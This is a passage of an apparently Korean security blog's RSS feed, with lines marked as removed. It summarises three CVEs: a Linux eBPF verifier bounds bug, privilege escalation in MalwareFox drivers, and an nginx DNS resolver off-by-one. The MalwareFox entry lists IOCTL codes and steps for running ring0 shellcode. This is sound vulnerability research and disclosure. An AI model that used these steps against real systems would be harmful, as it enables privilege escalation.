-      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/smap/">smap</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/freebsd/">freebsd</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/playstation5/">playstation5</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-31440: Linux Kernel eBPF verifier, incorrect bound check</title>
-      <link>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/</link>
-      <guid>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/</guid>
-      <pubDate>Sat, 29 May 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021-31440-an-incorrect-bounds-calculation-in-the-linux-kernel-ebpf-verifier">CVE-2021-31440: AN INCORRECT BOUNDS CALCULATION IN THE LINUX KERNEL EBPF VERIFIER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.7 ~ Linux kernel 5.11.15</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>eBPF는 런타임 중 안전하게 커널 코드를 삽입하기 위해 Verifier와 BPF instruction을 사용합니다. Verifier는 레지스터의 값의 변화와 그 값들의 허용 범위(이하 range)등을 추적해 memory load와 store의 out-of-bound 여부를 검사합니다. CVE-2021-31440을 악용하면 out-of-bound 검사를 무력화하고 로컬 권한 상승을 노릴 수 있습니다.</p><pre><code class="hljs c">...    <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umin_value))             reg-&gt;u32_min_value = (u32)reg-&gt;umin_value;     <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umax_value))             reg-&gt;u32_max_value = (u32)reg-&gt;umax_value;...</code></pre><p>위는 취약한 코드 부분의 일부입니다. 기존 eBPF 취약점들과 마찬가지로 CVE-2021-31440 또한 64 bit range의 하위 32 비트로부터 32 bit range를 도출하는 과정에서 버그가 발생합니다. <code>umin_value</code>가 1, <code>umax_value</code> 가 1&lt;&lt;32이라 할 때 <code>u32_min_value</code>는 1, <code>u32_max_value</code>는 0으로 설정되고 실제 runtime range와 다른 값을 Verifier에게 전달하게 됩니다.</p><p>Verifier는 잘못된 레지스터 허용범위를 갖게 되고 이를 통해 해커는 out-of-bound read/write access가 가능해 로컬 권한 상승을 할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-31727/31728: MalwareFox AntiMalware 로컬 권한상승 취약점</title>
-      <link>https://hackyboiz.github.io/2021/05/28/l0ch/2021-05-28/</link>
-      <guid>https://hackyboiz.github.io/2021/05/28/l0ch/2021-05-28/</guid>
-      <pubDate>Fri, 28 May 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/irql0/CVE-2021-31728&quot;&gt;CVE-2021-31728&lt;/</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irql0/CVE-2021-31728">CVE-2021-31728</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MalwareFox AntiMalware 2.74.0.150</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>안티 멀웨어 소프트웨어인 MalwareFox에서 발견된 로컬 권한 상승 취약점의 세부 정보 및 PoC가 공개되었습니다. 공개된 취약점은 두 가지로, 모두 MalwareFox의 <code>zam64.sys</code> 및 <code>zam32.sys</code> 드라이버에 존재합니다. </p><h3 id="CVE-2021-31727"><a href="#CVE-2021-31727" class="headerlink" title="CVE-2021-31727"></a>CVE-2021-31727</h3><p><code>zam64.sys</code>/<code>zam32.sys</code> 드라이버의 IOCTL <code>0x80002014</code> 및 <code>0x80002018</code> 은 unrestricted disk read/write가 가능합니다. 해커는 이를 악용해 부트 섹터를 덮어쓰거나 메모리 상의 코드를 덮어쓰는 방식으로 권한 상승을 트리거할 수 있습니다.</p><h3 id="CVE-2021-31728"><a href="#CVE-2021-31728" class="headerlink" title="CVE-2021-31728"></a>CVE-2021-31728</h3><p>IOCTL <code>0x80002040</code>은 UserBuffer에서 복사되는 대상 버퍼인 NonPagedPool에서 커널 메모리가 할당되며 입력 버퍼가 <code>0x1000</code> bytes보다 커 쉘코드에 사용될 수 있습니다. IOCTL <code>0x80002018</code> 은 miniport 드라이버의 IRP_MJ_SCSI_HANDLER에 대한 함수를 설정할 수 있으며 사용자 입력에 의해 지정된 드라이버에 SCSI 요청을 보내 이를 이용해 쉘코드를 실행할 수 있습니다.</p><p>위 취약점을 악용하면 아래 방법으로 드라이버 컨텍스트의 ring0 코드를 실행해 시스템 권한으로 프로세스를 실행 가능합니다.</p><ol><li>IOCTL <code>0x80002010</code>으로 <code>\.\ZemanaAntiMalware</code> 에 대한 핸들을 가져옴</li><li>IOCTL <code>0x80002040</code>으로 NonPagedPool에 커널 메모리 할당</li><li><code>SystemBigPoolInformation</code>로 할당된 커널 메모리 검색</li><li>IOCTL <code>0x80002044</code>로 miniport 드라이버 구성</li><li>IOCTL <code>0x80002014</code> 또는 <code>0x80002018</code>로 해커가 정의한 miniport 드라이버 실행</li></ol>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/antimalware/">antimalware</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/driver-exploit/">driver exploit</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/28/l0ch/2021-05-28/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-23017: nginx DNS Resolver Off-by-One Heap Write Vulnerability</title>
-      <link>https://hackyboiz.github.io/2021/05/27/idioth/2021-05-27/</link>
-      <guid>https://hackyboiz.github.io/2021/05/27/idioth/2021-05-27/</guid>
-      <pubDate>Thu, 27 May 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://x41-dsec.de/lab/advisories/x41-2021-002-nginx-res</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/">Advisory X41-2021-002: nginx DNS Resolver Off-by-One Heap Write Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>nginx 0.6.18 - 1.20.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈 소스 웹 서버 프로그램 nginx의 <code>ngx_resolver_copy()</code>에서 DNS response를 처리하는 동안 발생하는 off-by-one으로 인해 heap 영역의 1-byte 메모리를 덮어쓸 수 있는 취약점이 발견되었습니다.</p><p><code>ngx_resolver_copy()</code>는 DNS response에 포함된 DNS 도메인 이름의 유효성을 검사하고 압축을 해제하는 작업을 다음 두 단계로 처리합니다.</p><ol><li>압축되지 않은 도메인 이름 크기인 <code>len</code>을 계산하고 128 포인터가 넘어가거나 버퍼의 범위를 벗어나는 부분을 버립니다.</li><li>Output buffer를 할당하고 압축되지 않은 이름을 복사합니다.</li></ol><p>이 과정에서 1번의 <code>len</code>과 2번에 압축되지 않은 이름의 크기가 달라 <code>name-&gt;data</code>에서 1 바이트를 벗어나 덮어쓸 수 있습니다.</p><p>nginx DNS response를 받기 위해 DNS request를 보낸 후, <code>QNAME</code>, <code>NAME</code>, <code>RDATA</code> 중 하나의 값을 통해 해당 취약점을 트리거할 수 있습니다. 또한 <code>CNAME</code>을 사용할 경우 재귀적으로 처리되어 <code>ngx_resolve_name_locked()</code>가 호출될 때 추가적인 OOB write가 가능하고 <code>ngx_resolver_dup()</code>과 <code>ngx_crc32_short()</code>를 통해 OOB read가 가능합니다.</p><p>해당 취약점의 POC 코드는 <a href="https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py">github</a>에서 확인할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/oob-read/">oob read</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/dns-resolver/">dns resolver</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/oob-write/">oob write</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/nginx/">nginx</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/dns/">dns</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/off-by-one/">off-by-one</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/27/idioth/2021-05-27/#disqus_thread</comments>
       
     </item>
     
